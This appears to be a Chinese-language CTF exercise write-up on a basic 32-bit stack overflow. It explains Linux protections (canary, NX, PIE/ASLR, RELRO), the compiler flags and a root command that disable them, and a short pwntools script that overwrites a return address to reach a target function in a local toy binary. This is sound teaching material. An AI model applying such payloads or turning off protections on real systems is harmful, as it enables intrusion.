# PWN Exercise - Stack Overflow

## 准备

- gdb 插件 pwndbg
- pwntools 

## 保护机制
### CANNARY
栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。
### NX
NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
### PIE&ASLR
内存地址随机化机制（address space layout randomization)，有以下三种情况

 - 表示关闭进程地址空间随机化。
 - 表示将mmap的基址，stack和vdso页面随机化。
 - 表示在1的基础上增加栈（heap）的随机化。

PIE和ASLR不是一样的作用，ASLR只能对堆、栈和mmap随机化，而不能对如代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。

### RELRO
在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。   
RELRO 全名為 RELocation Read Only。共有三種保护模式，分別為 No / Partial / Full。

- No RELRO - Link Map、GOT 可写
- Partial RELRO - Link Map 不可写、GOT 可写
- Full RELRO - Link Map、GOT 皆不可写

## 编译

- NX：-z execstack / -z noexecstack (关闭 / 开启)
- Canary：-fno-stack-protector /-fstack-protector /  
- -fstack-protector-all (关闭 / 开启 / 全开启)
- PIE：-no-pie / -pie (关闭 / 开启)
- RELRO：-z norelro 

gcc -m32 -no-pie -z norelro -fno-stack-protector pwn0.c -o pwn0 
关闭地址随机化
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"

## PWN
>题目:输出You Hava already controlled it.为利用成功



`pwn checksec`
```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


### 计算偏移
```
               +-----------------+
               |     retaddr     |
               +-----------------+
               |     saved ebp   |
        ebp--->+-----------------+
               |                 |
               |                 |
               |                 |
               |                 |
               |                 |
               |                 |
  s,ebp-0x14-->+-----------------+
```
### EXP

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
elf = ELF('pwn0')
io = process(elf.path)

#开启新窗口用于gdb调试
#gdb.attach(io,'b * 0x0804921e') 
success_addr = 0x080491b6
payload = b'a'*0x14 + b'bbbb' + p32(success_addr)
io.sendline(payload)
io.interactive()
```

## Ref
- [linux程序的常用保护机制](https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)
- https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/